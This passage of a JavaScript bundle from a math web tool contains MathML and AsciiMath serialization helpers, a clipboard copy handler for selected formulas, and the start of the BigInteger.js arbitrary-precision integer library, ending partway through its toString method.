      for (var padding = columnWidths[j] - e.length; padding > 0; padding -= 1) {
        result += ' ';
      }
      result += e;
    }
  }
  return result;
};

//=getMatrix4
//?
var getTableFromAsciiMathMatrix = function (input) {
  // return RPN(s).matrix.getElements();
  var rows = [[]];
  var cellStart = 0;
  var b = 0;
  for (var i = 0; i < input.length; i += 1) {
    var c = input.charCodeAt(i);
    if (c === "{".charCodeAt(0)) {
      b += 1;
      if (b === 2) {
        cellStart = i + 1;
      }
    } else if (c === "}".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
      } else if (b === 0) {
        return null;
      }
      b -= 1;
    } else if (c === ",".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
        cellStart = i + 1;
      } else if (b === 1) {
        rows.push([]);
      } else if (b === 0) {
        return null;
      }
    } else if (c === "(".charCodeAt(0)) {
      if (b < 2) {
        return null;
      }
      b += 1;
    } else if (c === ")".charCodeAt(0)) {
      if (b < 3) {
        return null;
      }
      b -= 1;
    } else if (/[^\s]/.test(String.fromCharCode(c))) {
      if (b < 2) {
        return null;
      }
    }
  }
  return rows;
};

var serializeMathML = function (element) {
  var mathml = new XMLSerializer().serializeToString(element).replace(/\sxmlns="[^"]+"/g, '');
  mathml = mathml.replace(/[\u2061]/g, '&#x2061;'); // &af; or &ApplyFunction; are not supported when pasting XML into Word
  mathml = '<math xmlns="http://www.w3.org/1998/Math/MathML">' + mathml + '</math>';
  return formatXml(mathml);
};

var parseMathML = function (mathml) {
  mathml = mathml.replace(/&times;/g, "\u00D7");
  mathml = mathml.replace(/&af;/g, "\u2061");
  mathml = mathml.replace(/&it;/g, "\u2062");
  mathml = mathml.replace(/&minus;/g, "\u2212");
  mathml = mathml.replace(/&ii;/g, "\u2148");
  return new DOMParser().parseFromString(mathml, "text/xml").firstChild;
};

var mathmlToLaTeX = function (element) {
  return transformMathML(element, "LaTeX").string;
};

// TODO: remove "matrix containers" ({useMatrixContainer: false})
var serializeMatrixContainer = function (matrixContainer) {
  if (matrixContainer.getAttribute('data-matrix') != null && matrixContainer.firstElementChild.nextElementSibling === null) {
    matrixContainer = matrixContainer.firstElementChild;
    matrixContainer = matrixContainer.cloneNode(true);
    // Removal of extra attributes added by "MathML polyfill":
    //TODO: href, draggable, tabindex - ?
    matrixContainer.removeAttribute('style');
    matrixContainer.removeAttribute('class');
    var es = matrixContainer.querySelectorAll('*');
    for (var i = 0; i < es.length; i += 1) {
      es[i].removeAttribute('style');//TODO: remove
      es[i].removeAttribute('class');//TODO: remove
    }
  }

  // TODO: https://www.w3.org/TR/clipboard-apis/#writing-to-clipboard
  return serializeMathML(matrixContainer);
};

var formatXml = function (xml) {
  // https://stackoverflow.com/questions/376373/pretty-printing-xml-with-javascript
  // Note: /.<\/\w[^>]*>$ is faster than /.+<\/\w[^>]*>$
  var formatted = '';
  var padding = '';
  var nodes = xml.replace(/></g, '>\n<').split('\n');
  for (var i = 0; i < nodes.length; i += 1) {
    var node = nodes[i];
    var indent = '';
    if (!/.<\/\w[^>]*>$/.test(node)) {
      if (/^<\/\w/.test(node)) {
        padding = padding.slice(0, 0 - '  '.length);
      } else {
        if (/^<\w[^>]*[^\/]>.*$/.test(node)) {
          indent = '  ';
        }
      }
    }
    formatted += padding + node + '\n';
    padding += indent;
  }
  return formatted;
};

var getMatrixFromTextBlocks = function (textBlocks) {
  //! no new lines, no spaces

  function splitBlocks(textBlocks, type) {
    function m(text) {
      return type === "rows" ? text.boundingBox.y + text.boundingBox.height / 2 : text.boundingBox.x + text.boundingBox.width / 2;
    }
    function rowMiddle(row) {
      var result = 0;
      for (var j = 0; j < row.length; j += 1) {
        result = (result * j + m(row[j])) / (j + 1);
      }
      return result;
    }
    var rows = [];
    for (var n = 0; n < textBlocks.length; n += 1) {
      var text = textBlocks[n];
      var middle = m(text);
      var rowIndex = -1;
      for (var i = 0; i < rows.length; i += 1) {
        var row = rows[i];
        if (Math.abs((rowMiddle(row) - middle) / (type === "rows" ? text.boundingBox.height : text.boundingBox.width)) < 0.75) {
          rowIndex = i;
        }
      }
      if (rowIndex === -1) {
        rows.push([]);
        rowIndex = rows.length - 1;
      }
      rows[rowIndex].push(text);
    }
    rows.sort(function (a, b) {
      return rowMiddle(a) - rowMiddle(b);
    });
    return rows;
  }

  textBlocks = textBlocks.filter(function (textBlock) {
    return /[^\(\)\[\]\|]/.test(textBlock.rawValue);//TODO: ?
  });
  var rows = splitBlocks(textBlocks, "rows");
  var cols = splitBlocks(textBlocks, "cols");

  var table = new Array(rows.length);
  for (var i = 0; i < rows.length; i += 1) {
    table[i] = new Array(cols.length);
    for (var j = 0; j < cols.length; j += 1) {
      table[i][j] = '';
    }
  }

  for (var n = 0; n < textBlocks.length; n += 1) {
    var text = textBlocks[n];
    var rowIndex = -1;
    for (var i = 0; i < rows.length; i += 1) {
      if (rows[i].indexOf(text) !== -1) {
        rowIndex = i;
      }
    }
    var colIndex = -1;
    for (var i = 0; i < cols.length; i += 1) {
      if (cols[i].indexOf(text) !== -1) {
        colIndex = i;
      }
    }
    table[rowIndex][colIndex] += text.rawValue;
  }

  return table.map(function (x) {
    return x.join(' ');
  }).join('\n');
};

  globalThis.getTableFromAsciiMathMatrix = getTableFromAsciiMathMatrix;
  //globalThis.serializeMathML = serializeMathML;
  globalThis.parseMathML = parseMathML;
  globalThis.formatXml = formatXml;
  globalThis.toMultilineString = toMultilineString;
  globalThis.mathmlToLaTeX = mathmlToLaTeX;
  globalThis.serializeMatrixContainer = serializeMatrixContainer;
  globalThis.getMatrixFromTextBlocks = getMatrixFromTextBlocks;

}());

/*global window, document, Node, XMLSerializer, transformMathML */

(function () {
"use strict";

var isBlock = function (display) {
  switch (display) {
    case "inline":
    case "inline-block":
    case "inline-flex":
    case "inline-grid":
    case "inline-table":
    case "none":
    case "table-column":
    case "table-column-group":
    case "table-cell":
      return false;
  }
  return true;
};

var getNodeLength = function (container) {
  if (container.nodeType === Node.TEXT_NODE) {
    return container.data.length;
  }
  if (container.nodeType === Node.ELEMENT_NODE) {
    var count = 0;
    var child = container.firstChild;
    while (child != null) {
      child = child.nextSibling;
      count += 1;
    }
    return count;
  }
  return undefined;
};

var isBoundaryPoint = function (container, offset, which, node) {
  if (which === "end" && offset !== getNodeLength(container) || which === "start" && offset !== 0) {
    return false;
  }
  for (var x = container; x !== node; x = x.parentNode) {
    var y = which === "end" ? x.nextSibling : (which === "start" ? x.previousSibling : null);
    // https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Whitespace#Whitespace_helper_functions
    while (y != null && y.nodeType !== Node.ELEMENT_NODE && (y.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(y.data))) {
      y = which === "end" ? y.nextSibling : (which === "start" ? y.previousSibling : null);
    }
    if (y != null) {
      return false;
    }
  }
  return true;
};

var getChildNode = function (container, offset, which, node) {
  var child = null;
  var x = container;
  while (x !== node) {
    child = x;
    x = x.parentNode;
  }
  if (child != null) {
    child = which === "end" ? child.nextSibling : (which === "start" ? child : null);
  } else {
    var i = -1;
    child = container.firstChild; // node === container
    while (++i < offset) {
      child = child.nextSibling;
    }
  }
  return child;
};

var serialize = function (range, isLineStart) {
  // big thanks to everyone
  // see https://github.com/timdown/rangy/blob/master/src/modules/rangy-textrange.js
  // see https://github.com/WebKit/webkit/blob/ec2f4d46b97bb20fd0877b1f4b5ec50f7b9ec521/Source/WebCore/editing/TextIterator.cpp#L1188
  // see https://github.com/jackcviers/Rangy/blob/master/spec/innerText.htm

  var node = range.commonAncestorContainer;
  var startContainer = range.startContainer;
  var startOffset = range.startOffset;
  var endContainer = range.endContainer;
  var endOffset = range.endOffset;

  if (node.nodeType === Node.TEXT_NODE) {
    if (node !== startContainer || node !== endContainer) {
      throw new TypeError();
    }
    var data = node.data.slice(startOffset, endOffset);
    var whiteSpace = window.getComputedStyle(node.parentNode, null).whiteSpace;
    if (whiteSpace !== 'pre') {
      data = data.replace(/[\t\n\f\r\u0020]+/g, " ");
      if (isLineStart) {
        data = data.replace(/^[\t\n\f\r\u0020]/g, "");
      }
    }
    return data;
  }
  if (node.nodeType === Node.ELEMENT_NODE) {
    var display = window.getComputedStyle(node, null).display;
    if (display === "none") {
      return "";
    }
    var result = "";
    if (isBlock(display) && !isLineStart) {
      result += "\n";
      isLineStart = true;
    }
    var x = undefined;
    if (isBoundaryPoint(startContainer, startOffset, "start", node) &&
        isBoundaryPoint(endContainer, endOffset, "end", node)) {
      var tagName = node.tagName.toLowerCase();
      if (tagName === "math" || (tagName !== "mtext" && node.namespaceURI === "http://www.w3.org/1998/Math/MathML")) {
        x = transformMathML(node, "AsciiMath").string;
      }
      if (tagName === "br") {
        x = "\n";
      }
    }
    if (x != undefined) {
      result += x;
    } else {
      var startChildNode = getChildNode(startContainer, startOffset, "start", node);
      var endChildNode = getChildNode(endContainer, endOffset, "end", node);
      var childNode = startChildNode;
      while (childNode !== endChildNode) {
        var childNodeRange = {
          startContainer: childNode === startChildNode && startContainer !== node ? startContainer : childNode,
          startOffset: childNode === startChildNode && startContainer !== node ? startOffset : 0,
          endContainer: childNode.nextSibling === endChildNode && endContainer !== node ? endContainer : childNode,
          endOffset: childNode.nextSibling === endChildNode && endContainer !== node ? endOffset : getNodeLength(childNode),
          commonAncestorContainer: childNode
        };
        var y = serialize(childNodeRange, isLineStart);
        isLineStart = y === "" && isLineStart || y.slice(-1) === "\n";
        result += y;
        childNode = childNode.nextSibling;
      }
    }
    if (display === "table-cell") {
      result += "\t";
    }
    if (isBlock(display) && !isLineStart) {
      result = result.replace(/[\t\n\f\r\u0020]$/g, "");
      result += "\n";
      isLineStart = true;
    }
    return result;
  }
  return "";
};

var serializeAsPlainText = function (range) {
  var isLineStart = range.startContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.startContainer.data.slice(0, range.startOffset));
  var isLineEnd = range.endContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.endContainer.data.slice(range.endOffset));
  var staticRange = {
    startContainer: range.startContainer,
    startOffset: range.startOffset,
    endContainer: range.endContainer,
    endOffset: range.endOffset,
    commonAncestorContainer: range.commonAncestorContainer
  };
  var value = serialize(staticRange, false);
  if (isLineStart) {
    value = value.replace(/^[\t\n\f\r\u0020]/g, "");
  }
  if (isLineEnd) {
    value = value.replace(/[\t\n\f\r\u0020]$/g, "");
  }
  return value;
};

var serializeAsHTML = function (range) {
  var fragment = range.cloneContents();
  if (range.commonAncestorContainer.nodeType === Node.ELEMENT_NODE && range.commonAncestorContainer.namespaceURI === "http://www.w3.org/1998/Math/MathML") {//?
    var math = document.createElementNS("http://www.w3.org/1998/Math/MathML", "math");
    math.appendChild(fragment);
    fragment = math;
  }
  return new XMLSerializer().serializeToString(fragment); // to have the xmlns for <math> elements
};

var onCopyOrDragStart = function (event) {
  var dataTransfer = event.type === "copy" ? event.clipboardData : event.dataTransfer;
  var tagName = event.target.nodeType === Node.ELEMENT_NODE ? event.target.tagName.toLowerCase() : "";
  if (tagName !== "input" && tagName !== "textarea" && (tagName !== "a" || event.type === "copy") && tagName !== "img") {
    //! dataTransfer.effectAllowed throws an exception in FireFox if tagName is INPUT or TEXTAREA
    if ((event.type === "copy" || dataTransfer.effectAllowed === "uninitialized") && !event.defaultPrevented) {
      var selection = window.getSelection();
      var rangeCount = selection.rangeCount;
      if (rangeCount !== 0 && !selection.isCollapsed) {
        var i = -1;
        var plainText = "";
        var htmlText = "";
        while (++i < rangeCount) {
          //TODO: Firefox makes multiple selection when some <button> elements are selected ...
          var range = selection.getRangeAt(i);
          htmlText += serializeAsHTML(range);
          plainText += serializeAsPlainText(range);
        }
        // see also https://github.com/w3c/clipboard-apis/issues/48
        dataTransfer.setData("text/html", htmlText);
        dataTransfer.setData("text/plain", plainText);
        if (event.type === "copy") {
          event.preventDefault();
        } else {
          dataTransfer.effectAllowed = "copy";
        }
      }
    }
  }
};

if (typeof document !== "undefined") {
  document.addEventListener("copy", onCopyOrDragStart, false);
  document.addEventListener("dragstart", onCopyOrDragStart, false);
}

//!
// rangeInnerText
globalThis.serializeAsHTML = serializeAsHTML;
globalThis.serializeAsPlainText = serializeAsPlainText;

}());

(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2*/

(function (global) {
  "use strict";

  // BigInteger.js
  // Available under Public Domain
  // https://github.com/Yaffle/BigInteger/

  // For implementation details, see "The Handbook of Applied Cryptography"
  // http://www.cacr.math.uwaterloo.ca/hac/about/chap14.pdf

  var parseInteger = function (s, from, to, radix) {
    var i = from - 1;
    var n = 0;
    var y = radix < 10 ? radix : 10;
    while (++i < to) {
      var code = s.charCodeAt(i);
      var v = code - "0".charCodeAt(0);
      if (v < 0 || y <= v) {
        v = 10 - "A".charCodeAt(0) + code;
        if (v < 10 || radix <= v) {
          v = 10 - "a".charCodeAt(0) + code;
          if (v < 10 || radix <= v) {
            throw new RangeError();
          }
        }
      }
      n = n * radix + v;
    }
    return n;
  };

  var createArray = function (length) {
    var x = new Array(length);
    var i = -1;
    while (++i < length) {
      x[i] = 0;
    }
    return x;
  };

  var epsilon = 2 / (9007199254740991 + 1);
  while (1 + epsilon / 2 !== 1) {
    epsilon /= 2;
  }
  var BASE = 2 / epsilon;
  var s = 134217728;
  while (s * s < 2 / epsilon) {
    s *= 2;
  }
  var SPLIT = s + 1;
  var BASELOG2 = Math.ceil(Math.log(BASE) / Math.log(2));

  // Veltkamp-Dekker's algorithm
  // see http://web.mit.edu/tabbott/Public/quaddouble-debian/qd-2.3.4-old/docs/qd.pdf
  var fma = function (a, b, product) {
    var at = SPLIT * a;
    var ahi = at - (at - a);
    var alo = a - ahi;
    var bt = SPLIT * b;
    var bhi = bt - (bt - b);
    var blo = b - bhi;
    var error = ((ahi * bhi + product) + ahi * blo + alo * bhi) + alo * blo;
    return error;
  };

  var fastTrunc = function (x) {
    var v = (x - BASE) + BASE;
    return v > x ? v - 1 : v;
  };

  var performMultiplication = function (carry, a, b) {
    var product = a * b;
    var error = fma(a, b, -product);

    var hi = (product / BASE) - BASE + BASE;
    var lo = product - hi * BASE + error;

    if (lo >= 0) {
      lo -= BASE;
      hi += 1;
    }

    lo += carry;
    if (lo < 0) {
      lo += BASE;
      hi -= 1;
    }

    return {lo: lo, hi: hi};
  };

  var performDivision = function (a, b, divisor) {
    if (a >= divisor) {
      throw new RangeError();
    }
    var p = a * BASE;
    var q = fastTrunc(p / divisor);

    var r = 0 - fma(q, divisor, -p);
    if (r < 0) {
      q -= 1;
      r += divisor;
    }

    r += b - divisor;
    if (r < 0) {
      r += divisor;
    } else {
      q += 1;
    }
    var y = fastTrunc(r / divisor);
    r -= y * divisor;
    q += y;
    return {q: q, r: r};
  };

  function BigIntegerInternal(sign, magnitude, length) {
    this.sign = sign;
    this.magnitude = magnitude;
    this.length = length;
  }

  var createBigInteger = function (sign, magnitude, length) {
    return new BigIntegerInternal(sign, magnitude, length);
  };
  
  var fromHugeNumber = function (n) {
    var sign = n < 0 ? 1 : 0;
    var a = n < 0 ? 0 - n : 0 + n;
    if (a === 1 / 0) {
      throw new RangeError();
    }
    console.assert(BASE === Math.pow(2, 53));
    var i = 0;
    while (a >= Math.pow(BASE, 2)) {
      a /= BASE;
      i += 1;
    }
    var hi = Math.floor(a / BASE);
    var lo = a - hi * BASE;
    var digits = createArray(i + 2);
    digits[i + 1] = hi;
    digits[i + 0] = lo;
    return createBigInteger(sign, digits, i + 2);
  };

  var fromNumber = function (n) {
    if (Math.floor(n) !== n) {
      throw new RangeError("Cannot convert " + n + " to BigInteger");
    }
    if (n < BASE && 0 - n < BASE) {
      var a = createArray(1);
      a[0] = n < 0 ? 0 - n : 0 + n;
      return createBigInteger(n < 0 ? 1 : 0, a, n === 0 ? 0 : 1);
    }
    return fromHugeNumber(n);
  };

  var fromString = function (s) {
    var length = s.length;
    if (length === 0) {
      throw new RangeError();
    }
    var sign = 0;
    var signCharCode = s.charCodeAt(0);
    var from = 0;
    if (signCharCode === "+".charCodeAt(0)) {
      from = 1;
    }
    if (signCharCode === "-".charCodeAt(0)) {
      from = 1;
      sign = 1;
    }
    var radix = 10;
    if (from === 0 && length >= 2 && s.charCodeAt(0) === "0".charCodeAt(0)) {
      if (s.charCodeAt(1) === "b".charCodeAt(0)) {
        radix = 2;
        from = 2;
      } else if (s.charCodeAt(1) === "o".charCodeAt(0)) {
        radix = 8;
        from = 2;
      } else if (s.charCodeAt(1) === "x".charCodeAt(0)) {
        radix = 16;
        from = 2;
      }
    }
    length -= from;
    if (length === 0) {
      throw new RangeError();
    }

    var groupLength = 0;
    var groupRadix = 1;
    var limit = fastTrunc(BASE / radix);
    while (groupRadix <= limit) {
      groupLength += 1;
      groupRadix *= radix;
    }

    var size = Math.floor((length - 1) / groupLength) + 1;
    var magnitude = createArray(size);
    var start = from + 1 + (length - 1 - (size - 1) * groupLength) - groupLength;

    var j = -1;
    while (++j < size) {
      var groupStart = start + j * groupLength;
      var c = parseInteger(s, (groupStart >= from ? groupStart : from), groupStart + groupLength, radix);
      var l = -1;
      while (++l < j) {
        var tmp = performMultiplication(c, magnitude[l], groupRadix);
        var lo = tmp.lo;
        var hi = tmp.hi;
        magnitude[l] = lo;
        c = hi;
      }
      magnitude[j] = c;
    }

    while (size > 0 && magnitude[size - 1] === 0) {
      size -= 1;
    }

    return createBigInteger(size === 0 ? 0 : sign, magnitude, size);
  };

  // Math.pow(2, n) is slow in Chrome 93
  function exp(x, n) {
    var a = 1;
    while (n !== 0) {
      var q = (n >> 1);
      if (n !== (q << 1)) {
        a *= x;
      }
      n = q;
      x *= x;
    }
    return a;
  }

  BigIntegerInternal.BigInt = function (x) {
    if (typeof x === "number") {
      return fromNumber(x);
    }
    if (typeof x === "string") {
      return fromString(x);
    }
    if (typeof x === "bigint") {
      return fromString(x.toString());
    }
    if (x instanceof BigIntegerInternal) {
      return x;
    }
    if (typeof x === "boolean") {
      return fromNumber(Number(x));
    }
    throw new RangeError();
  };

  BigIntegerInternal.asUintN = function (bits, bigint) {
    if (bits < 0) {
      throw new RangeError();
    }
    var n = Math.ceil(bits / BASELOG2);
    bits -= BASELOG2 * n;
    if (bigint.sign === 1) {
      throw new RangeError("not implemented");
    }
    if (n > bigint.length) {
      return bigint;
    }
    var array = createArray(n);
    for (var i = 0; i < n; i += 1) {
      array[i] = bigint.magnitude[i];
    }
    var m = exp(2, BASELOG2 + bits);
    array[n - 1] = array[n - 1] - Math.floor(array[n - 1] / m) * m;
    while (n >= 0 && array[n - 1] === 0) {
      n -= 1;
    }
    return createBigInteger(0, array, n);
  };

  BigIntegerInternal.toNumber = function (a) {
    if (a.length === 0) {
      return 0;
    }
    if (a.length === 1) {
      return a.sign === 1 ? 0 - a.magnitude[0] : a.magnitude[0];
    }
    if (BASE + 1 !== BASE) {
      throw new RangeError();
    }
    var x = a.magnitude[a.length - 1];
    var y = a.magnitude[a.length - 2];
    var i = a.length - 3;
    while (i >= 0 && a.magnitude[i] === 0) {
      i -= 1;
    }
    if (i >= 0 && (x !== 1 && y % 2 === 0 || x === 1 && y % 2 === 1)) {
      y += 1;
    }
    var z = (x * BASE + y) * exp(BASE, a.length - 2);
    return a.sign === 1 ? 0 - z : z;
  };

  var compareMagnitude = function (a, b) {
    if (a === b) {
      return 0;
    }
    var c1 = a.length - b.length;
    if (c1 !== 0) {
      return c1 < 0 ? -1 : +1;
    }
    var i = a.length;
    while (--i >= 0) {
      var c = a.magnitude[i] - b.magnitude[i];
      if (c !== 0) {
        return c < 0 ? -1 : +1;
      }
    }
    return 0;
  };

  var compareTo = function (a, b) {
    var c = a.sign === b.sign ? compareMagnitude(a, b) : 1;
    return a.sign === 1 ? 0 - c : c; // positive zero will be returned for c === 0
  };

  var addAndSubtract = function (a, b, isSubtraction) {
    var z = compareMagnitude(a, b);
    var resultSign = z < 0 ? (isSubtraction !== 0 ? 1 - b.sign : b.sign) : a.sign;
    var min = z < 0 ? a : b;
    var max = z < 0 ? b : a;
    // |a| <= |b|
    if (min.length === 0) {
      return createBigInteger(resultSign, max.magnitude, max.length);
    }
    var subtract = 0;
    var resultLength = max.length;
    if (a.sign !== (isSubtraction !== 0 ? 1 - b.sign : b.sign)) {
      subtract = 1;
      if (min.length === resultLength) {
        while (resultLength > 0 && min.magnitude[resultLength - 1] === max.magnitude[resultLength - 1]) {
          resultLength -= 1;
        }
      }
      if (resultLength === 0) { // a === (-b)
        return createBigInteger(0, createArray(0), 0);
      }
    }
    // result !== 0
    var result = createArray(resultLength + (1 - subtract));
    var i = -1;
    var c = 0;
    while (++i < min.length) {
      var aDigit = min.magnitude[i];
      c += max.magnitude[i] + (subtract !== 0 ? 0 - aDigit : aDigit - BASE);
      if (c < 0) {
        result[i] = BASE + c;
        c = 0 - subtract;
      } else {
        result[i] = c;
        c = 1 - subtract;
      }
    }
    i -= 1;
    while (++i < resultLength) {
      c += max.magnitude[i] + (subtract !== 0 ? 0 : 0 - BASE);
      if (c < 0) {
        result[i] = BASE + c;
        c = 0 - subtract;
      } else {
        result[i] = c;
        c = 1 - subtract;
      }
    }
    if (subtract === 0) {
      result[resultLength] = c;
      resultLength += c !== 0 ? 1 : 0;
    } else {
      while (resultLength > 0 && result[resultLength - 1] === 0) {
        resultLength -= 1;
      }
    }
    return createBigInteger(resultSign, result, resultLength);
  };

  BigIntegerInternal.add = function (a, b) {
    return addAndSubtract(a, b, 0);
  };

  BigIntegerInternal.subtract = function (a, b) {
    return addAndSubtract(a, b, 1);
  };

  BigIntegerInternal.multiply = function (a, b) {
    if (a.length < b.length) {
      var tmp = a;
      a = b;
      b = tmp;
    }
    var alength = a.length;
    var blength = b.length;
    var am = a.magnitude;
    var bm = b.magnitude;
    var asign = a.sign;
    var bsign = b.sign;
    if (alength === 0 || blength === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    if (alength === 1 && am[0] === 1) {
      return createBigInteger(asign === 1 ? 1 - bsign : bsign, bm, blength);
    }
    if (blength === 1 && bm[0] === 1) {
      return createBigInteger(asign === 1 ? 1 - bsign : bsign, am, alength);
    }
    var astart = 0;
    while (am[astart] === 0) { // to optimize multiplications of a power of BASE
      astart += 1;
    }
    var resultSign = asign === 1 ? 1 - bsign : bsign;
    var resultLength = alength + blength;
    var result = createArray(resultLength);
    var i = -1;
    while (++i < blength) {
      var digit = bm[i];
      if (digit !== 0) { // to optimize multiplications by a power of BASE
        var c = 0;
        var j = astart - 1;
        while (++j < alength) {
          var carry = 1;
          c += result[j + i] - BASE;
          if (c < 0) {
            c += BASE;
            carry = 0;
          }
          var tmp = performMultiplication(c, am[j], digit);
          var lo = tmp.lo;
          var hi = tmp.hi;
          result[j + i] = lo;
          c = hi + carry;
        }
        result[alength + i] = c;
      }
    }
    if (result[resultLength - 1] === 0) {
      resultLength -= 1;
    }
    return createBigInteger(resultSign, result, resultLength);
  };

  var divideAndRemainder = function (a, b, isDivision) {
    if (b.length === 0) {
      throw new RangeError();
    }
    if (a.length === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    var quotientSign = a.sign === 1 ? 1 - b.sign : b.sign;
    if (b.length === 1 && b.magnitude[0] === 1) {
      if (isDivision !== 0) {
        return createBigInteger(quotientSign, a.magnitude, a.length);
      }
      return createBigInteger(0, createArray(0), 0);
    }

    var divisorOffset = a.length + 1; // `+ 1` for extra digit in case of normalization
    var divisorAndRemainder = createArray(divisorOffset + b.length + 1); // `+ 1` to avoid `index < length` checks
    var divisor = divisorAndRemainder;
    var remainder = divisorAndRemainder;
    var n = -1;
    while (++n < a.length) {
      remainder[n] = a.magnitude[n];
    }
    var m = -1;
    while (++m < b.length) {
      divisor[divisorOffset + m] = b.magnitude[m];
    }

    var top = divisor[divisorOffset + b.length - 1];

    // normalization
    var lambda = 1;
    if (b.length > 1) {
      lambda = fastTrunc(BASE / (top + 1));
      if (lambda > 1) {
        var carry = 0;
        var l = -1;
        while (++l < divisorOffset + b.length) {
          var tmp = performMultiplication(carry, divisorAndRemainder[l], lambda);
          var lo = tmp.lo;
          var hi = tmp.hi;
          divisorAndRemainder[l] = lo;
          carry = hi;
        }
        divisorAndRemainder[divisorOffset + b.length] = carry;
        top = divisor[divisorOffset + b.length - 1];
      }
      // assertion
      if (top < fastTrunc(BASE / 2)) {
        throw new RangeError();
      }
    }

    var shift = a.length - b.length + 1;
    if (shift < 0) {
      shift = 0;
    }
    var quotient = undefined;
    var quotientLength = 0;

    // to optimize divisions by a power of BASE
    var lastNonZero = 0;
    while (divisor[divisorOffset + lastNonZero] === 0) {
      lastNonZero += 1;
    }

    var i = shift;
    while (--i >= 0) {
      var t = b.length + i;
      var q = BASE - 1;
      if (remainder[t] !== top) {
        var tmp2 = performDivision(remainder[t], remainder[t - 1], top);
        var q2 = tmp2.q;
        //var r2 = tmp2.r;
        q = q2;
      }

      var ax = 0;
      var bx = 0;
      var j = i - 1 + lastNonZero;
      while (++j <= t) {
        var tmp3 = performMultiplication(bx, q, divisor[divisorOffset + j - i]);
        var lo3 = tmp3.lo;
        var hi3 = tmp3.hi;
        bx = hi3;
        ax += remainder[j] - lo3;
        if (ax < 0) {
          remainder[j] = BASE + ax;
          ax = -1;
        } else {
          remainder[j] = ax;
          ax = 0;
        }
      }
      while (ax !== 0) {
        q -= 1;
        var c = 0;
        var k = i - 1 + lastNonZero;
        while (++k <= t) {
          c += remainder[k] - BASE + divisor[divisorOffset + k - i];
          if (c < 0) {
            remainder[k] = BASE + c;
            c = 0;
          } else {
            remainder[k] = c;
            c = +1;
          }
        }
        ax += c;
      }
      if (isDivision !== 0 && q !== 0) {
        if (quotientLength === 0) {
          quotientLength = i + 1;
          quotient = createArray(quotientLength);
        }
        quotient[i] = q;
      }
    }

    if (isDivision !== 0) {
      if (quotientLength === 0) {
        return createBigInteger(0, createArray(0), 0);
      }
      return createBigInteger(quotientSign, quotient, quotientLength);
    }

    var remainderLength = a.length + 1;
    if (lambda > 1) {
      var r = 0;
      var p = remainderLength;
      while (--p >= 0) {
        var tmp4 = performDivision(r, remainder[p], lambda);
        var q4 = tmp4.q;
        var r4 = tmp4.r;
        remainder[p] = q4;
        r = r4;
      }
      if (r !== 0) {
        // assertion
        throw new RangeError();
      }
    }
    while (remainderLength > 0 && remainder[remainderLength - 1] === 0) {
      remainderLength -= 1;
    }
    if (remainderLength === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    var result = createArray(remainderLength);
    var o = -1;
    while (++o < remainderLength) {
      result[o] = remainder[o];
    }
    return createBigInteger(a.sign, result, remainderLength);
  };

  BigIntegerInternal.divide = function (a, b) {
    return divideAndRemainder(a, b, 1);
  };

  BigIntegerInternal.remainder = function (a, b) {
    return divideAndRemainder(a, b, 0);
  };

  BigIntegerInternal.unaryMinus = function (a) {
    return createBigInteger(a.length === 0 ? a.sign : 1 - a.sign, a.magnitude, a.length);
  };

  BigIntegerInternal.equal = function (a, b) {
    return compareTo(a, b) === 0;
  };
  BigIntegerInternal.lessThan = function (a, b) {
    return compareTo(a, b) < 0;
  };
  BigIntegerInternal.greaterThan = function (a, b) {
    return compareTo(a, b) > 0;
  };
  BigIntegerInternal.notEqual = function (a, b) {
    return compareTo(a, b) !== 0;
  };
  BigIntegerInternal.lessThanOrEqual = function (a, b) {
    return compareTo(a, b) <= 0;
  };
  BigIntegerInternal.greaterThanOrEqual = function (a, b) {
    return compareTo(a, b) >= 0;
  };

  BigIntegerInternal.exponentiate = function (a, b) {
    var n = BigIntegerInternal.toNumber(b);
    if (n < 0) {
      throw new RangeError();
    }
    if (n > 9007199254740991) {
      var y = BigIntegerInternal.toNumber(a);
      if (y === 0 || y === -1 || y === +1) {
        return y === -1 && BigIntegerInternal.toNumber(BigIntegerInternal.remainder(b, BigIntegerInternal.BigInt(2))) === 0 ? BigIntegerInternal.unaryMinus(a) : a;
      }
      throw new RangeError();
    }
    if (n === 0) {
      return BigIntegerInternal.BigInt(1);
    }
    if (a.length === 1 && (a.magnitude[0] === 2 || a.magnitude[0] === 16)) {
      var bits = Math.floor(Math.log(BASE) / Math.log(2) + 0.5);
      var abits = Math.floor(Math.log(a.magnitude[0]) / Math.log(2) + 0.5);
      var nn = abits * n;
      var q = Math.floor(nn / bits);
      var r = nn - q * bits;
      var array = createArray(q + 1);
      array[q] = Math.pow(2, r);
      return createBigInteger(a.sign === 0 || n % 2 === 0 ? 0 : 1, array, q + 1);
    }
    var x = a;
    while (n % 2 === 0) {
      n = Math.floor(n / 2);
      x = BigIntegerInternal.multiply(x, x);
    }
    var accumulator = x;
    n -= 1;
    if (n >= 2) {
      while (n >= 2) {
        var t = Math.floor(n / 2);
        if (t * 2 !== n) {
          accumulator = BigIntegerInternal.multiply(accumulator, x);
        }
        n = t;
        x = BigIntegerInternal.multiply(x, x);
      }
      accumulator = BigIntegerInternal.multiply(accumulator, x);
    }
    return accumulator;
  };

  BigIntegerInternal.prototype.toString = function (radix) {
    if (radix == undefined) {
      radix = 10;
    }
    if (radix !== 10 && (radix < 2 || radix > 36 || radix !== Math.floor(radix))) {
      throw new RangeError("radix argument must be an integer between 2 and 36");
    }

    // console.time(); var n = BigInteger.exponentiate(Math.pow(2, 4), Math.pow(2, 16)); console.timeEnd(); console.time(); n.toString(16).length; console.timeEnd();
    if (this.length > 8 && true) { // https://github.com/GoogleChromeLabs/jsbi/blob/c9b179a4d5d34d35dd24cf84f7c1def54dc4a590/jsbi.mjs#L880
      if (this.sign === 1) {
        return '-' + BigIntegerInternal.unaryMinus(this).toString(radix);
      }
      var s = Math.floor(this.length * Math.log(BASE) / Math.log(radix) / 2 + 0.5 - 1);
